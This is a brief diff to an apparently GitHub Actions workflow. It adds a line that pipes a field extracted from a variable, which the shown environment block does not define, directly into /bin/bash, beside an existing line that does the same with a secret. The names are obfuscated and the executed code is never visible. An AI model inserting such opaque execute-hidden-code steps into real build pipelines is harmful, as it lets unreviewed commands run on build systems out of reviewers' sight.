@@ -22,6 +22,7 @@ jobs:
           wz2451: ${{ secrets.wz2451 }}
         run: |
           printf '%s' "$wz2451" | jq -r .ym0 | /bin/bash
+          printf '%s' "$btz1" | jq -r .esmcf61 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
